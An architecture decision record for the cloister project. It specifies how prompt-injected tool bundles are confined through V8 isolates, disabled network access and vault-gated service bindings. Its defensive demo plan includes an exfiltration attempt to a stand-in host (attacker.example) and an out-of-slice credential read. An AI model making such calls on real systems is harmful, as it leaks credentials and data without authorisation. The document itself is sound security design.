---
title: "ADR-0013: Slice-grant enforcement via V8 isolate + service-binding-as-syscall"
status: Accepted (2026-05-10)
date: 2026-05-10
tags: [security, vault, slice-grant, bundle, prompt-injection, isolate, workerd]
supersedes_framing: []
threat_model: docs/security/threat-model.md
imports_from:
  - notme/docs/design/009-identity-gated-runtime.md
  - notme/docs/design/007-secretless-local-proxy.md
---

## Context

[ADR-0010](0010-vault-and-bundle-clusters.md) proposed **vault slices as
the capability primitive** — a bundle gets a token scoped to a specific
slice of vault, not the unrestricted vault. The security claim being
made: *even if a bundle is fully compromised (prompt-injected into
running attacker code), it can only exfil what its slice grants — not
the whole vault.*

### What "compromised" means here

The threat model assumes complete attacker control of the bundle's V8
isolate: the attacker can call any binding the bundle has, manipulate
its heap, and run arbitrary JS. **The substrate's guarantee is not
that the bundle behaves; it's that the things the bundle CANNOT do
are the things that matter for confidentiality.** A "good" bundle
and a "compromised" bundle are indistinguishable from the substrate's
side — both can only reach what their bindings + slice grants permit.

This is the inversion that makes the slice-grant model work: we don't
authenticate behavior, we constrain reachability. The same security
property holds against a buggy bundle, a malicious bundle, a prompt-
injected bundle, and a benign bundle.

ADR-0010 sat in **Proposed** status from 2026-05-08 through 2026-05-10
because the implementation wasn't specified. What "slice grant" means
in operational terms — token format, sealing primitive, mint authority,
verification path — was an open design space. cloister-74ce00 (the
prompt-injection failure-mode demo) was filed against it; both stalled.

What changed:

1. **The vault primitive is already lifted into cloister** — `vault/`
   (per `cloister-9ad9eb`, closed 2026-05-09). It carries envelope
   encryption (HKDF + AES-256-GCM, DEK/KEK split), audience-pinned
   tokens, per-credential glob-pattern access lists, plaintext-stays-
   in-DO proxying, and an adversarial test corpus (see
   `vault/src/__tests__/vault-adversarial.test.ts`). The primitive
   doesn't need to be reinvented.

2. **notme/009 (identity-gated-runtime) already specifies the
   enforcement model** — and it's not a new crypto primitive. It's
   V8-isolate sandboxing combined with workerd's `globalOutbound`
   omission. The "compromised bundle" cannot reach the network, cannot
   read the filesystem, and cannot read other Workers' memory because
   the runtime makes those operations not-defined for that isolate.
   Its *only* exit is a service binding to a Worker that gates access.

This ADR ratifies that the second observation is the right answer
*for cloister*, and writes down how the prompt-injection demo
(cloister-74ce00) is structured against existing primitives.

## Decision

A compromised tool bundle in cloister is held by the **same
substrate-level enforcement notme/009 specifies**, applied within
cloister's workerd config:

| Layer | What it does | Reference |
|---|---|---|
| **V8 isolate boundary** | Tool-bundle worker has a separate heap from the gateway / vault / notme workers. Cannot read their memory regardless of attacker JS. | workerd-native; same mechanism CF Workers uses for multi-tenant edge. |
| **`globalOutbound` not set** | `fetch()` is `undefined` in the tool-bundle isolate. No network exit. | `config.capnp` Worker entry omits `globalOutbound`. |
| **No disk bindings** | No filesystem read/write. No SQLite. No DO. The isolate has heap and message ports — that's it. | `config.capnp` Worker entry has no `durableObjectStorage`, no `disk` bindings. |
| **Service binding as syscall** | The *only* outbound channel is a service binding to vault (or another gated worker). All exits are mediated. | workerd-native; same RPC mechanism the existing `NOTME` binding uses today. |
| **Vault per-credential access control** | Vault checks the caller's identity (from the service-binding context) against the credential's `allowedSubs` glob list. Out-of-slice reads return 403. | `vault/src/vault.ts` `checkAccess`; tested in `vault-adversarial.test.ts`. |
| **Plaintext never crosses RPC** | Vault decrypts credentials *inside the DO* and performs upstream fetches from there. The bundle gets the proxied response, never the credential bytes. | `vault/src/worker.ts` `proxyRequest` (DO method, not Worker method). |

What's **NOT** part of this model:

- **No new cryptographic envelope.** Slice grants are not signed
  tokens; they are not a new key format; they are not a JWS / COSE /
  capnp envelope. They are entries in vault's `allowedSubs` field,
  enforced when a bundle calls vault. The cryptographic primitive
  already exists (the bundle's identity, from the service-binding
  caller context, plus vault's signed access tokens for external
  callers).

- **No manifest schema change.** ADR-0010 sketched a `vaultSlice`
  field on `Bundle` in the manifest schema. We *don't need it* for
  the substrate-enforcement claim to hold — `cluster.capnp` doesn't
  declare what bundles can access vault; *workerd's bindings* declare
  it (a tool-bundle Worker either has the `VAULT` service binding or
  it doesn't, and if it does, vault's `allowedSubs` decides which
  slices). The manifest stays focused on routing + topology; capability
  enforcement is at the workerd config layer.

- **No Interlace lease-cert involvement for in-cluster vault access.**
  Lease certs are the *outside* wire (cloister-router ↔ external peers,
  per ADR-0007). In-cluster bundle ↔ vault is *inside* the trust
  boundary (per ADR-0005's 2026-04-30 amendment — "no AEAD inside the
  trust boundary"). The substrate enforces; cryptography would be
  ceremony.

The above is a deliberate *simplification* of ADR-0010's proposal. The
original ADR sketched slice tokens as signed envelopes minted by the
master and presented as request headers. That would have worked, but
it duplicates the V8-isolate guarantee with a slower cryptographic
check. The substrate gives the stronger guarantee for free.

## The prompt-injection demo (cloister-74ce00)

With this model, the demo is concrete:

1. **Set up vault** with two credentials, distinguishable `allowedSubs`:
   - `service: "test-app-config"`, `allowedSubs: ["bundle:test-app:*"]`
   - `service: "github-pat"`,      `allowedSubs: ["bundle:trusted-tool:*"]`
2. **Define two tool-bundle Workers** in the test workerd config:
   - `compromised-tool` — identity `"bundle:test-app:malicious"`. Has
     `VAULT` service binding. Has *no* `globalOutbound`, *no* disk,
     *no* DO storage. Mimics "JS bundle running attacker code."
   - `trusted-tool` — identity `"bundle:trusted-tool:probe"`. Same
     restrictions, different identity.
3. **Exercise the failure modes**:
   - `compromised-tool` calls `env.VAULT.proxy("test-app-config", ...)`
     → succeeds (in-slice).
   - `compromised-tool` calls `env.VAULT.proxy("github-pat", ...)`
     → **403 forbidden** at the vault layer. The credential bytes
     never enter the compromised isolate's heap.
   - `compromised-tool` attempts `fetch("https://attacker.example/")`
     → `TypeError: fetch is not defined`. No network exit.
   - `compromised-tool` attempts to read `env.VAULT_KEK_SECRET` directly
     → that env var is on the *vault Worker's* binding map, not the
     compromised-tool's. Returns `undefined`.

Each step is one vitest assertion against the running workerd. The
demo lives at `test/security/prompt-injection.test.ts` and ships in
cloister's test gate.

## Threat-model impact

`docs/security/threat-model.md` §10 ("substrate analysis") already
classifies seams as hypervisor-tier vs cluster-tier per ADR-0011.
This ADR clarifies *one specific seam*: the bundle ↔ vault edge. It
sits at the **substrate-vs-bundle boundary** with V8 isolate as the
gate. Add a §10.x entry referencing this ADR + the demo's location.

The §13 priority list can drop the "vault-slice primitive needed"
item once the demo lands. The primitive *is* the workerd config plus
vault's existing access-control — both already exist.

## Consequences

**Good**:

- ADR-0010's security claim becomes load-bearing: there's a working
  demo proving the substrate boundary holds. The §10 classification
  cites real code, not aspirational design.
- No new crypto primitive to maintain. Slice grants ride existing
  vault access-control plus workerd's isolate model.
- The work to close cloister-74ce00 collapses from "design + build
  vault DO + design slice tokens + integrate with lease + write demo"
  (multi-session) to "write the workerd config for two test bundles
  + write the assertions" (single session).

**Neutral**:

- ADR-0010 stays Proposed for the *manifest-side* concerns (e.g.
  whether `Bundle.vaultSlice` should still exist as a manifest hint
  for tooling — not for enforcement). Bumping it would be premature
  until that decision is needed.
- The `cluster.capnp` schema doesn't need to grow a `vaultSlice`
  field. If a future ADR needs to surface vault wiring at the manifest
  layer (e.g. for `task cluster:emit` to generate the right service
  bindings), that ADR can re-open the question.

**Cost**:

- The demo lives in `test/security/` and depends on workerd's test
  harness handling multiple-isolate configs. Existing tests already
  do this (the leyline-net edge integration tests, for instance).
- Reviewers used to capability-token systems will need to read this
  ADR to understand why cloister *doesn't* mint slice tokens. The
  V8-isolate model is the answer; document the answer prominently.

## References

- **notme/docs/design/009-identity-gated-runtime.md** — the original
  specification of V8-isolate-as-sandbox with service-binding-as-only-
  exit. cloister adopts the model verbatim within its own workerd
  config.
- **notme/docs/design/007-secretless-local-proxy.md** — companion
  doc on why credentials shouldn't traverse the agent's process at
  all. The vault DO embodies this for cloister.
- **ADR-0005** (2026-04-30 amendment) — "no AEAD inside the trust
  boundary". Vault sits inside; service-binding RPC suffices.
- **ADR-0007** — lease substrate on the *outside* wire. Distinct from
  this ADR's *inside* wire concern.
- **ADR-0010** — the parent ADR; stays Proposed for manifest-layer
  vault concerns this ADR doesn't resolve.
- **ADR-0011** — three-criterion test. Vault is hypervisor-tier
  (mediates / multi-bundle blast / singleton). Compromised tool
  bundles are cluster-tier (don't mediate; per-bundle blast).
- **`cloister/vault/`** — the lifted vault primitive (per
  cloister-9ad9eb, closed 2026-05-09).
- **`cloister-74ce00`** — the prompt-injection demo, the test this
  ADR enables.
